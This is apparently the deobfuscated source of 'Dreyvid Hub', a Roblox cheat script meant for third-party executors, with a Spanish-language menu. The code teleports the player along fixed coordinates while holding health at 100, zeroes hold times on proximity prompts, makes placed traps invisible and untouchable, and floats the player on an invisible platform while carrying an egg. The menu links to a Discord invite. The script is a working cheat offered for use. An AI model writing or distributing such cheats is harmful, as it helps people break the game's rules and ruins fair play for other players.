local t1 = {}
local t2 = {}
local v3 = unpack or table.unpack
local _game = game
t1.value2 = "Players"
t1.value1 = "GetService"
t1.value2 = _game:GetService("Players")
t1.value1 = game:GetService("TweenService")
t2.value1 = t1.value1
t1.value1 = game:GetService("ProximityPromptService")
t2.value2 = t1.value1
t1.value1 = game:GetService("RunService")
t2.value3 = t1.value1
local _game2 = game
t1.value1 = _game2.GetService
t1.value3 = "CollectionService"
t1.value1 = t1.value1(_game2, "Workspace")
t2.value4 = t1.value1
t1.value1 = game:GetService("Stats")
t2.value5 = t1.value1
t1.value1 = game:GetService("TeleportService")
t2.value6 = t1.value1
t1.value1 = game:GetService("HttpService")
t2.value7 = t1.value1
t1.value1 = game:GetService("ReplicatedStorage")
t2.value8 = t1.value1
t1.value3 = game:GetService("CollectionService")
t1.value1 = game:GetService("UserInputService")
t2.value9 = t1.value1
local _game3 = game
t1.value1 = _game3.GetService
t2.value10 = nil
t1.value1 = t1.value1(_game3, "GuiService")
t2.value11 = t1.value1
t2.value12 = t1.value2.LocalPlayer
t2.value13 = t2.value4.CurrentCamera
t2.value14 = game.PlaceId
t2.value10 = nil
pcall(function()
    t2.value10 = gethui()
end)

if not t2.value10 then
    pcall(function()
        t2.value10 = game:GetService("CoreGui")
    end)
end
if not t2.value10 then
    t2.value10 = t2.value12:WaitForChild("PlayerGui")
end
t2.value15 = "https://discord.gg/MbQWs6SAgK"
t1.value4 = "Enum"
t1.value5 = 200
function t2.value16(p1)
    if setclipboard then
        setclipboard(p1)

        return
    end

    if toclipboard then
        toclipboard(p1)
    end
end
local function v7()
    if readfile and isfile then
        local ok, result = pcall(isfile, "dreyvid_config_v2.txt")

        if ok and result then
            local ok2, result2 = pcall(readfile, "dreyvid_config_v2.txt")

            if ok2 and result2 then
                local num = tonumber(result2)

                if num then
                    return math.clamp(num, 0.7, 1.15)
                end
            end
        end
    end

    return 1
end
local GetUserIdFromNameAsync = t1.value2.GetUserIdFromNameAsync
t1.value6 = -343.74
local v9 = GetUserIdFromNameAsync(t1.value2, "anki1362")
local _Enum = Enum
t1.value7 = -351.18
t1.value4 = "ThumbnailType"
local ThumbnailType = _Enum.ThumbnailType
t1.value8 = -358.75
local HeadShot = ThumbnailType.HeadShot
t2.value17 = t1.value2:GetUserThumbnailAsync(v9, HeadShot, Enum.ThumbnailSize.Size420x420)
t1.value4 = "CFrame"
t1.value9 = 2
local _CFrame = CFrame
t1.value10 = -335.25
t1.value4 = "new"
local v14 = _CFrame.new(4747.71, 70.57, t1.value10)

t1.value4 = CFrame
t1.value4 = t1.value4.new(3520.94, 70.73, t1.value6)
t1.value10 = "CFrame"
t1.value6 = 70.88
local _CFrame2 = CFrame
t1.value10 = "new"
t1.value11 = "table"
local v16 = _CFrame2.new(2446.02, t1.value6, t1.value7)

t1.value6 = "CFrame"
t1.value7 = 71.02
t1.value10 = CFrame.new(1352.11, t1.value7, t1.value8)
t1.value6 = CFrame
t1.value8 = 71.13
t1.value7 = "new"
t1.value6 = { t1.value6.new(544.49, t1.value8, -364.34) }
t2.value18 = {
	v14,
	t1.value4,
	v16,
	t1.value10,
	v3(t1.value6)
}
t2.value19 = false
t2.value20 = nil
t1.value12 = {}
t2.value21 = {}
t2.value22 = {}
function t2.value23()
    local Character = t2.value12.Character
    if not Character then
        return
    end
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    if not Humanoid or not HumanoidRootPart then
        return
    end
    local value13CFrame = t2.value13.CFrame
    local CameraType = t2.value13.CameraType
    local Scriptable = Enum.CameraType.Scriptable
    t2.value13.CameraType = Scriptable
    t2.value13.CFrame = value13CFrame
    Humanoid.BreakJointsOnDeath = false
    for _, descendant in ipairs(Character:GetDescendants()) do
        if descendant:IsA("Motor6D") then
            descendant.Enabled = true
        end
    end
    local connection
    HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
    HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
    for _, v in ipairs(t2.value18) do
        Humanoid.PlatformStand = true
        Humanoid.Health = 100
        HumanoidRootPart.CFrame = v
        HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        t2.value13.CFrame = value13CFrame
        task.wait(0.02)
    end
    local elapsed = os.clock()
    connection = t2.value3.Heartbeat:Connect(function()
        if os.clock() - elapsed > 0.35 then
            connection:Disconnect()

            return
        end

        Humanoid.Health = 100
        Humanoid.PlatformStand = true
        HumanoidRootPart.CFrame = t2.value18[#t2.value18]
        HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        t2.value13.CFrame = value13CFrame
    end)
    task.wait(0.35)
    Humanoid.PlatformStand = false
    t2.value13.CameraType = CameraType
end
local function v17(p2)
    local v60 = p2

    if p2 then
        v60 = typeof(p2) == "Instance" and p2:IsA("ProximityPrompt")
    end

    if not v60 then
        return
    end

    if t2.value19 then
        if t2.value21[p2] == nil then
            t2.value21[p2] = p2.HoldDuration
        end

        p2.HoldDuration = 0
        p2.RequiresLineOfSight = false

        return
    end

    if t2.value21[p2] ~= nil then
        p2.HoldDuration = t2.value21[p2]
        t2.value21[p2] = nil
    end
end
local function v18(p3)
    if p3 then
        for _, descendant in ipairs(t2.value4:GetDescendants()) do
            v17(descendant)
        end

        table.insert(t2.value22, t2.value4.DescendantAdded:Connect(v17))
        table.insert(t2.value22, t2.value2.PromptShown:Connect(v17))

        return
    end

    for _, v in ipairs(t2.value22) do
        if v then
            v:Disconnect()
        end
    end

    t2.value22 = {}

    for k, v in pairs(t2.value21) do
        local v68 = k

        if v68 and v68.Parent then
            v68.HoldDuration = v
        end
    end

    t2.value21 = {}
end
t2.value24 = 40
t2.value25 = 0.2375
t2.value26 = 3
t2.value27 = Vector3.new(200, t1.value9, t1.value5)
t2.value28 = false
t2.value29 = nil
t2.value30 = nil
t2.value31 = nil
t2.value32 = setmetatable(t1.value12, {
	__mode = "k"
})
local t3 = {}
t2.value33 = Instance.new("Folder")
t2.value33.Name = "PlatInvisible"
t2.value33.Parent = t2.value4
function t2.value34(p4)
    if not p4 or not p4:IsA("ProximityPrompt") then
        return
    end

    if p4.HoldDuration <= 0 then
        return
    end

    if t2.value32[p4] == nil then
        t2.value32[p4] = p4.HoldDuration
    end

    pcall(function()
        p4.HoldDuration = 0
    end)
end
table.insert(t3, t2.value2.PromptShown:Connect(t2.value34))

local insert = table.insert
t1.value11 = t2.value4.DescendantAdded
insert(t3, t1.value11.Connect(t1.value11, function(p5)
    if p5:IsA("ProximityPrompt") then
        t2.value34(p5)
    end
end))

for _, descendant in ipairs(t2.value4:GetDescendants()) do
    if descendant:IsA("ProximityPrompt") then
        t2.value34(descendant)
    end
end
t2.value35 = {}
t2.value36 = {}
function t2.value37(p6)
    if not p6 or not p6:IsA("BasePart") then
        return
    end

    if t2.value36[p6] == nil then
        t2.value36[p6] = {
			Transparency = p6.Transparency,
			LocalTransparencyModifier = p6.LocalTransparencyModifier
		}
    end

    pcall(function()
        p6.Transparency = 1
        p6.LocalTransparencyModifier = 1
    end)
end
function t2.value38(p7)
    if not p7 or not p7.Parent then
        return
    end

    local t4 = {}

    if p7:IsA("BasePart") then
        t2.value37(p7)
        t4[#t4 + 1] = p7
    end

    for _, descendant in ipairs(p7:GetDescendants()) do
        local v76 = descendant

        if v76:IsA("BasePart") then
            t2.value37(v76)
            t4[#t4 + 1] = v76
        elseif v76:IsA("Decal") or v76:IsA("Texture") then
            if t2.value36[v76] == nil then
                t2.value36[v76] = {
					Transparency = v76.Transparency
				}
            end

            pcall(function()
                v76.Transparency = 1
            end)
            t4[#t4 + 1] = v76
        else
            local v77 = v76:IsA("ParticleEmitter")

            if not v77 then
                v77 = v76:IsA("Trail") or v76:IsA("Beam")
            end

            if v77 then
                pcall(function()
                    v76.Enabled = false
                end)
            else
                local v78 = v76:IsA("PointLight")

                if not v78 then
                    v78 = v76:IsA("SpotLight") or v76:IsA("SurfaceLight")
                end

                if v78 then
                    pcall(function()
                        v76.Enabled = false
                    end)
                end
            end
        end
    end

    task.spawn(function()
        while p7 and p7.Parent do
            for _, v in ipairs(t4) do
                local v394 = v

                if v394.Parent then
                    pcall(function()
                        if v394:IsA("BasePart") then
                            v394.Transparency = 1
                            v394.LocalTransparencyModifier = 1

                            return
                        end

                        if v394:IsA("Decal") or v394:IsA("Texture") then
                            v394.Transparency = 1
                        end
                    end)
                end
            end

            t2.value3.Heartbeat:Wait()
        end
    end)
end
local function v23(p8)
    if not p8 or not p8:IsA("BasePart") then
        return
    end

    if t2.value35[p8] == nil then
        t2.value35[p8] = p8.CanTouch
    end

    pcall(function()
        p8.CanTouch = false
    end)
end
local function v24(p9)
    if not p9 or not p9.Parent then
        return
    end

    if p9:IsA("BasePart") then
        v23(p9)
    end

    for _, descendant in ipairs(p9:GetDescendants()) do
        if descendant:IsA("BasePart") then
            v23(descendant)
        end
    end

    t2.value38(p9)
end
for _, v in ipairs(t1.value3:GetTagged("PlacedTrap")) do
    v24(v)
end
t2.value39 = nil
t1.value3:GetInstanceAddedSignal("PlacedTrap"):Connect(function(p10)
    task.defer(function()
        v24(p10)
    end)
end)

function t2.value40(p11)
    local raycastParams = RaycastParams.new()

    raycastParams.FilterType = Enum.RaycastFilterType.Exclude

    local t5 = { t2.value33 }

    if t2.value12.Character then
        table.insert(t5, t2.value12.Character)
    end

    raycastParams.FilterDescendantsInstances = t5

    local raycastResult = t2.value4:Raycast(p11, Vector3.new(0, -2000, 0), raycastParams)
    local v88 = raycastResult and raycastResult.Position.Y

    if not v88 then
        v88 = p11.Y
    end

    return v88
end
function t2.value41()
    local Character = t2.value12.Character

    if not Character then
        return nil, nil
    end

    return Character:FindFirstChild("HumanoidRootPart"), Character
end
t2.value42 = nil
local function v27(p12, p13, p14)
    if t2.value31 then
        t2.value31:Destroy()
    end

    t2.value31 = Instance.new("Part")
    t2.value31.Name = "PisoInvisible"
    t2.value31.Anchored = true
    t2.value31.CanCollide = true
    t2.value31.CanQuery = false
    t2.value31.CanTouch = false
    t2.value31.Material = Enum.Material.SmoothPlastic
    t2.value31.Transparency = 1
    t2.value31.Size = t2.value27
    t2.value31.CFrame = CFrame.new(p12, p14, p13)
    t2.value31.Parent = t2.value33
end
t2.value43 = false
function t2.value44()
    if t2.value43 or not t2.value28 then
        return
    end

    local v95, _ = t2.value41()
    local v97 = v95

    if not v97 then
        return
    end

    t2.value43 = true
    t2.value29 = t2.value40(v97.Position) + t2.value24

    local v98 = t2.value29 + t2.value26

    v27(v97.Position.X, v97.Position.Z, t2.value29 - 0.5)

    local Position = v97.Position
    local vector3 = Vector3.new(Position.X, v98, Position.Z)
    local CFrameRotation = v97.CFrame.Rotation
    local elapsed = os.clock()

    pcall(function()
        v97.AssemblyLinearVelocity = Vector3.zero
        v97.AssemblyAngularVelocity = Vector3.zero
    end)

    while t2.value43 do
        local v103 = math.clamp((os.clock() - elapsed) / t2.value25, 0, 1)
        local v104 = Position:Lerp(vector3, v103 * v103 * (3 - 2 * v103))

        pcall(function()
            v97.CFrame = CFrame.new(v104) * CFrameRotation
            v97.AssemblyLinearVelocity = Vector3.zero
            v97.AssemblyAngularVelocity = Vector3.zero
        end)

        if v103 >= 1 then
            break
        end

        t2.value3.Heartbeat:Wait()
    end

    if v97 and v97.Parent then
        pcall(function()
            v97.CFrame = CFrame.new(vector3) * CFrameRotation
            v97.AssemblyLinearVelocity = Vector3.zero
            v97.AssemblyAngularVelocity = Vector3.zero
        end)
    end

    if not t2.value30 then
        t2.value30 = t2.value3.Stepped:Connect(function()
            if not t2.value28 or not t2.value29 then
                return
            end

            local v405 = t2.value41()

            if not v405 then
                return
            end

            if t2.value31 and t2.value31.Parent then
                local PositionX = t2.value31.Position.X
                local PositionZ = t2.value31.Position.Z
                local PositionX2 = v405.Position.X
                local PositionZ2 = v405.Position.Z

                if (PositionX - PositionX2) * (PositionX - PositionX2) + (PositionZ - PositionZ2) * (PositionZ - PositionZ2) > 4 then
                    t2.value31.CFrame = CFrame.new(PositionX2, t2.value29 - 0.5, PositionZ2)
                end
            end

            if v405.Position.Y < t2.value29 then
                local v410 = math.max(v405.AssemblyLinearVelocity.Y, 0)
                local new = CFrame.new
                local PositionX = v405.Position.X
                local PositionZ = v405.Position.Z

                v405.CFrame = new(PositionX, t2.value29, PositionZ) * v405.CFrame.Rotation
                v405.AssemblyLinearVelocity = Vector3.new(v405.AssemblyLinearVelocity.X, v410, v405.AssemblyLinearVelocity.Z)
                v405.AssemblyAngularVelocity = Vector3.zero
            end
        end)
    end

    t2.value43 = false
end
function t2.value39()
    if not t2.value28 then
        return
    end

    task.wait(0.1)
    t2.value44()
end
t2.value42 = false
pcall(function()
    local EggState = require(t2.value8.Client.EggState)
    local v94 = EggState

    if EggState then
        v94 = EggState.CarryChanged and type(EggState.CarryChanged.Connect) == "function"
    end

    if v94 then
        EggState.CarryChanged:Connect(function(p15)
            if type(p15) == "table" and p15.IsCarrying == true then
                task.spawn(t2.value39)
            end
        end)
        t2.value42 = true
    end
end)

if not t2.value42 then
    function t1.value13(p16)
        if not p16 then
            return
        end

        p16.ChildAdded:Connect(function(child)
            if child:IsA("Tool") then
                task.spawn(t2.value39)
            end
        end)
    end

    t2.value12.CharacterAdded:Connect(t1.value13)

    if t2.value12.Character then
        t1.value13(t2.value12.Character)
    end
end
t2.value12.CharacterAdded:Connect(function()
    task.wait(0.5)
    t2.value29 = nil

    if t2.value31 then
        t2.value31:Destroy()
        t2.value31 = nil
    end
end)

function t2.value45()
    t2.value28 = false
    t2.value29 = nil
    t2.value43 = false

    if t2.value30 then
        pcall(function()
            t2.value30:Disconnect()
        end)
        t2.value30 = nil
    end

    if t2.value31 then
        t2.value31:Destroy()
        t2.value31 = nil
    end
end
function t2.value46()
    t2.value28 = true
end
local function v28(p17, p18, p19, p20, p21, p22)
    local Frame = Instance.new("Frame")

    Frame.Size = UDim2.new(0, p18, 0, p19)
    Frame.Position = UDim2.new(0.5, p20, 0.5, p21)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
    Frame.BackgroundTransparency = 0.85
    Frame.BorderSizePixel = 0
    Frame.ZIndex = p22
    Frame.Parent = p17

    local UICorner = Instance.new("UICorner")

    UICorner.CornerRadius = UDim.new(1, 0)
    UICorner.Parent = Frame

    local UIGradient = Instance.new("UIGradient")

    UIGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 140, 255)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 100, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 220, 255))
	})
    UIGradient.Rotation = 45
    UIGradient.Parent = Frame

    return Frame, UIGradient
end
t2.value47 = nil
if t2.value10:FindFirstChild("DreyvidHub") then
    t2.value10.DreyvidHub:Destroy()
end
if t2.value10:FindFirstChild("DreyvidIntro") then
    t2.value10.DreyvidIntro:Destroy()
end
local function v29()
    if t2.value10:FindFirstChild("DreyvidHub") then
        t2.value10.DreyvidHub:Destroy()
    end

    local ScreenGui = Instance.new("ScreenGui")

    ScreenGui.Name = "DreyvidHub"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = t2.value10

    local v124 = v7()

    do
        local Frame = Instance.new("Frame")

        Frame.Size = UDim2.new(0, 145, 0, 26)
        Frame.Position = UDim2.new(0.5, -72, 0, 4)
        Frame.BackgroundTransparency = 1
        Frame.ZIndex = 5
        Frame.Parent = ScreenGui

        do
            local Frame2 = Instance.new("Frame")

            Frame2.Size = UDim2.new(1, 20, 1, 10)
            Frame2.Position = UDim2.new(0.5, -10, 0.5, -5)
            Frame2.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
            Frame2.BackgroundTransparency = 0.85
            Frame2.BorderSizePixel = 0
            Frame2.ZIndex = 4
            Frame2.Parent = Frame

            local UICorner = Instance.new("UICorner")

            UICorner.CornerRadius = UDim.new(1, 0)
            UICorner.Parent = Frame2
        end

        local TextLabel = Instance.new("TextLabel")

        TextLabel.Size = UDim2.new(1, 0, 1, 0)
        TextLabel.BackgroundTransparency = 1
        TextLabel.Text = "Dreyvid Hub"
        TextLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
        TextLabel.Font = Enum.Font.GothamBold
        TextLabel.TextSize = 18
        TextLabel.TextStrokeTransparency = 0.5
        TextLabel.TextStrokeColor3 = Color3.fromRGB(60, 140, 255)
        TextLabel.ZIndex = 5
        TextLabel.Parent = Frame
    end

    local Frame, TextButton, TextButton2, UIStroke, Frame3, Frame4, Frame5, TextButton3, UIStroke2, Frame6, TextButton4, TextButton5, u274, v275

    do
        local v188, v189, v190, v191, v192, v193, v194, v195, Frame7, Frame8, UIStroke3, Frame9, Frame10, Frame11, TextButton6

        do
            local UIScale, UIScale2

            do
                local UIStroke4, UIGradient

                do
                    local Frame12, UIStroke5, UIStroke6

                    do
                        local Frame13 = Instance.new("Frame")

                        Frame13.Size = UDim2.fromOffset(280, 125)
                        Frame13.Position = UDim2.new(0, 5, 0, 37)
                        Frame13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        Frame13.BackgroundTransparency = 0.5
                        Frame13.BorderSizePixel = 0
                        Frame13.ZIndex = 1
                        Frame13.Parent = ScreenGui

                        do
                            local UICorner = Instance.new("UICorner")

                            UICorner.CornerRadius = UDim.new(0, 16)
                            UICorner.Parent = Frame13
                            Frame12 = Instance.new("Frame")
                            Frame12.Size = UDim2.fromOffset(270, 115)
                            Frame12.Position = UDim2.new(0, 10, 0, 42)
                            Frame12.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
                            Frame12.BorderSizePixel = 0
                            Frame12.ClipsDescendants = true
                            Frame12.Active = true
                            Frame12.Draggable = true
                            Frame12.ZIndex = 2
                            Frame12.Parent = ScreenGui

                            local UICorner2 = Instance.new("UICorner")

                            UICorner2.CornerRadius = UDim.new(0, 14)
                            UICorner2.Parent = Frame12

                            local UIGradient2 = Instance.new("UIGradient")

                            UIGradient2.Color = ColorSequence.new(Color3.fromRGB(24, 28, 40), Color3.fromRGB(12, 14, 20))
                            UIGradient2.Rotation = 135
                            UIGradient2.Parent = Frame12
                        end

                        UIStroke5 = Instance.new("UIStroke")
                        UIStroke5.Color = Color3.fromRGB(90, 120, 160)
                        UIStroke5.Thickness = 1.2
                        UIStroke5.Transparency = 0.4
                        UIStroke5.Parent = Frame12
                        Frame12:GetPropertyChangedSignal("Position"):Connect(function()
                            Frame13.Position = UDim2.new(Frame12.Position.X.Scale, Frame12.Position.X.Offset - 5, Frame12.Position.Y.Scale, Frame12.Position.Y.Offset - 5)
                        end)

                        local ImageLabel = Instance.new("ImageLabel")

                        ImageLabel.Size = UDim2.fromOffset(42, 42)
                        ImageLabel.Position = UDim2.new(0, 14, 0, 12)
                        ImageLabel.BackgroundTransparency = 1
                        ImageLabel.Image = t2.value17
                        ImageLabel.ScaleType = Enum.ScaleType.Crop
                        ImageLabel.ZIndex = 3
                        ImageLabel.Parent = Frame12

                        local UICorner = Instance.new("UICorner")

                        UICorner.CornerRadius = UDim.new(1, 0)
                        UICorner.Parent = ImageLabel
                        UIStroke6 = Instance.new("UIStroke")
                        UIStroke6.Color = Color3.fromRGB(120, 180, 255)
                        UIStroke6.Thickness = 1.5
                        UIStroke6.Transparency = 0.2
                        UIStroke6.Parent = ImageLabel

                        local TextLabel = Instance.new("TextLabel")

                        TextLabel.Size = UDim2.new(1, -110, 0, 20)
                        TextLabel.Position = UDim2.new(0, 64, 0, 14)
                        TextLabel.BackgroundTransparency = 1
                        TextLabel.Text = "Drey"
                        TextLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
                        TextLabel.Font = Enum.Font.GothamBold
                        TextLabel.TextSize = 17
                        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                        TextLabel.ZIndex = 3
                        TextLabel.Parent = Frame12
                    end

                    do
                        local TextLabel = Instance.new("TextLabel")

                        TextLabel.Size = UDim2.new(1, -110, 0, 14)
                        TextLabel.Position = UDim2.new(0, 64, 0, 36)
                        TextLabel.BackgroundTransparency = 1
                        TextLabel.Text = "ANTI HIT"
                        TextLabel.TextColor3 = Color3.fromRGB(140, 150, 170)
                        TextLabel.Font = Enum.Font.GothamMedium
                        TextLabel.TextSize = 10
                        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                        TextLabel.ZIndex = 3
                        TextLabel.Parent = Frame12
                        Frame = Instance.new("Frame")
                        Frame.Size = UDim2.fromOffset(6, 6)
                        Frame.Position = UDim2.new(0, 118, 0, 39)
                        Frame.BackgroundColor3 = Color3.fromRGB(230, 70, 80)
                        Frame.BorderSizePixel = 0
                        Frame.ZIndex = 3
                        Frame.Parent = Frame12

                        local UICorner = Instance.new("UICorner")

                        UICorner.CornerRadius = UDim.new(1, 0)
                        UICorner.Parent = Frame
                        TextButton = Instance.new("TextButton")
                        TextButton.Size = UDim2.fromOffset(28, 28)
                        TextButton.Position = UDim2.new(1, -72, 0, 10)
                        TextButton.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
                        TextButton.Text = "âš™"
                        TextButton.TextColor3 = Color3.fromRGB(120, 180, 255)
                        TextButton.Font = Enum.Font.GothamBold
                        TextButton.TextSize = 16
                        TextButton.AutoButtonColor = false
                        TextButton.ZIndex = 3
                        TextButton.Parent = Frame12

                        local UICorner3 = Instance.new("UICorner")

                        UICorner3.CornerRadius = UDim.new(0, 8)
                        UICorner3.Parent = TextButton

                        local UIStroke7 = Instance.new("UIStroke")

                        UIStroke7.Color = Color3.fromRGB(70, 90, 130)
                        UIStroke7.Thickness = 1
                        UIStroke7.Transparency = 0.6
                        UIStroke7.Parent = TextButton
                    end

                    do
                        local ImageButton = Instance.new("ImageButton")

                        ImageButton.Size = UDim2.fromOffset(28, 28)
                        ImageButton.Position = UDim2.new(1, -40, 0, 10)
                        ImageButton.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
                        ImageButton.Image = "rbxassetid://93628638506572"
                        ImageButton.ImageColor3 = Color3.fromRGB(120, 180, 255)
                        ImageButton.ScaleType = Enum.ScaleType.Fit
                        ImageButton.ZIndex = 3
                        ImageButton.Parent = Frame12

                        local UICorner = Instance.new("UICorner")

                        UICorner.CornerRadius = UDim.new(0, 8)
                        UICorner.Parent = ImageButton

                        local UIStroke8 = Instance.new("UIStroke")

                        UIStroke8.Color = Color3.fromRGB(70, 90, 130)
                        UIStroke8.Thickness = 1
                        UIStroke8.Transparency = 0.6
                        UIStroke8.Parent = ImageButton
                        ImageButton.MouseButton1Click:Connect(function()
                            t2.value16(t2.value15)
                        end)
                        TextButton2 = Instance.new("TextButton")
                        TextButton2.Size = UDim2.new(1, -28, 0, 34)
                        TextButton2.Position = UDim2.new(0, 14, 1, -48)
                        TextButton2.BackgroundColor3 = Color3.fromRGB(40, 25, 30)
                        TextButton2.Text = "OFF"
                        TextButton2.TextColor3 = Color3.fromRGB(230, 120, 120)
                        TextButton2.Font = Enum.Font.GothamBold
                        TextButton2.TextSize = 14
                        TextButton2.AutoButtonColor = false
                        TextButton2.ZIndex = 3
                        TextButton2.Parent = Frame12

                        local UICorner4 = Instance.new("UICorner")

                        UICorner4.CornerRadius = UDim.new(0, 8)
                        UICorner4.Parent = TextButton2
                    end

                    UIStroke = Instance.new("UIStroke")
                    UIStroke.Color = Color3.fromRGB(120, 50, 60)
                    UIStroke.Thickness = 1
                    UIStroke.Transparency = 0.4
                    UIStroke.Parent = TextButton2
                    task.spawn(function()
                        while ScreenGui.Parent do
                            t2.value1:Create(UIStroke5, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
								Color = Color3.fromRGB(120, 180, 255),
								Transparency = 0.1,
								Thickness = 1.8
							}):Play()
                            task.wait(1.8)
                            t2.value1:Create(UIStroke5, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
								Color = Color3.fromRGB(90, 120, 160),
								Transparency = 0.4,
								Thickness = 1.2
							}):Play()
                            task.wait(1.8)
                        end
                    end)
                    task.spawn(function()
                        while ScreenGui.Parent do
                            local value1 = t2.value1
                            local v432 = UIStroke6
                            local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            local color3 = Color3.fromRGB(180, 120, 255)

                            value1:Create(v432, tweenInfo, {
								Transparency = 0,
								Thickness = 2,
								Color = color3
							}):Play()
                            task.wait(1.5)

                            local value1_2 = t2.value1
                            local v436 = UIStroke6
                            local new = TweenInfo.new
                            local Sine = Enum.EasingStyle.Sine
                            local EasingDirection = Enum.EasingDirection
                            local Create = value1_2.Create
                            local v441 = new(1.5, Sine, EasingDirection.InOut)
                            local color3_2 = Color3.fromRGB(120, 180, 255)

                            Create(value1_2, v436, v441, {
								Transparency = 0.2,
								Thickness = 1.5,
								Color = color3_2
							}):Play()
                            task.wait(1.5)
                        end
                    end)
                    task.spawn(function()
                        while ScreenGui.Parent do
                            t2.value1:Create(Frame, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
								Size = UDim2.fromOffset(8, 8),
								Position = UDim2.new(0, 117, 0, 38)
							}):Play()
                            task.wait(0.6)
                            t2.value1:Create(Frame, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
								Size = UDim2.fromOffset(6, 6),
								Position = UDim2.new(0, 118, 0, 39)
							}):Play()
                            task.wait(0.6)
                        end
                    end)
                    UIScale = Instance.new("UIScale")
                    UIScale.Scale = v124
                    UIScale.Parent = Frame12
                    Frame3 = Instance.new("Frame")
                    Frame3.Size = UDim2.fromOffset(250, 105)
                    Frame3.Position = UDim2.new(0, 5, 0, 167)
                    Frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    Frame3.BackgroundTransparency = 0.5
                    Frame3.BorderSizePixel = 0
                    Frame3.ZIndex = 1
                    Frame3.Visible = false
                    Frame3.Parent = ScreenGui

                    local UICorner = Instance.new("UICorner")

                    UICorner.CornerRadius = UDim.new(0, 16)
                    UICorner.Parent = Frame3
                    Frame4 = Instance.new("Frame")
                    Frame4.Size = UDim2.fromOffset(240, 95)
                    Frame4.Position = UDim2.new(0, 10, 0, 172)
                    Frame4.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
                    Frame4.BorderSizePixel = 0
                    Frame4.ClipsDescendants = true
                    Frame4.Active = true
                    Frame4.Draggable = true
                    Frame4.ZIndex = 2
                    Frame4.Visible = false
                    Frame4.Parent = ScreenGui

                    local UICorner5 = Instance.new("UICorner")

                    UICorner5.CornerRadius = UDim.new(0, 14)
                    UICorner5.Parent = Frame4

                    local UIGradient3 = Instance.new("UIGradient")

                    UIGradient3.Color = ColorSequence.new(Color3.fromRGB(24, 28, 40), Color3.fromRGB(12, 14, 20))
                    UIGradient3.Rotation = 135
                    UIGradient3.Parent = Frame4
                    UIStroke4 = Instance.new("UIStroke")
                    UIStroke4.Color = Color3.fromRGB(90, 120, 160)
                    UIStroke4.Thickness = 1.2
                    UIStroke4.Transparency = 0.4
                    UIStroke4.Parent = Frame4
                    Frame4:GetPropertyChangedSignal("Position"):Connect(function()
                        Frame3.Position = UDim2.new(Frame4.Position.X.Scale, Frame4.Position.X.Offset - 5, Frame4.Position.Y.Scale, Frame4.Position.Y.Offset - 5)
                    end)

                    local TextLabel = Instance.new("TextLabel")

                    TextLabel.Size = UDim2.new(1, -28, 0, 24)
                    TextLabel.Position = UDim2.new(0, 14, 0, 12)
                    TextLabel.BackgroundTransparency = 1
                    TextLabel.Text = "Agarra el huevo mÃ¡s tiempo"
                    TextLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
                    TextLabel.Font = Enum.Font.GothamBold
                    TextLabel.TextSize = 15
                    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                    TextLabel.ZIndex = 3
                    TextLabel.Parent = Frame4
                    UIGradient = Instance.new("UIGradient")
                    UIGradient.Color = ColorSequence.new({
						ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
						ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 200, 255)),
						ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 140, 255))
					})
                    UIGradient.Rotation = 0
                    UIGradient.Parent = TextLabel
                end

                local TextLabel = Instance.new("TextLabel")

                TextLabel.Size = UDim2.new(1, -28, 0, 14)
                TextLabel.Position = UDim2.new(0, 14, 0, 36)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Text = "Se queda arriba automÃ¡ticamente"
                TextLabel.TextColor3 = Color3.fromRGB(140, 150, 170)
                TextLabel.Font = Enum.Font.GothamMedium
                TextLabel.TextSize = 10
                TextLabel.TextXAlignment = Enum.TextXAlignment.Left
                TextLabel.ZIndex = 3
                TextLabel.Parent = Frame4
                Frame5 = Instance.new("Frame")
                Frame5.Size = UDim2.fromOffset(6, 6)
                Frame5.Position = UDim2.new(1, -28, 0, 18)
                Frame5.BackgroundColor3 = Color3.fromRGB(230, 70, 80)
                Frame5.BorderSizePixel = 0
                Frame5.ZIndex = 3
                Frame5.Parent = Frame4

                local UICorner = Instance.new("UICorner")

                UICorner.CornerRadius = UDim.new(1, 0)
                UICorner.Parent = Frame5
                TextButton3 = Instance.new("TextButton")
                TextButton3.Size = UDim2.new(1, -28, 0, 28)
                TextButton3.Position = UDim2.new(0, 14, 1, -38)
                TextButton3.BackgroundColor3 = Color3.fromRGB(40, 25, 30)
                TextButton3.Text = "OFF"
                TextButton3.TextColor3 = Color3.fromRGB(230, 120, 120)
                TextButton3.Font = Enum.Font.GothamBold
                TextButton3.TextSize = 12
                TextButton3.AutoButtonColor = false
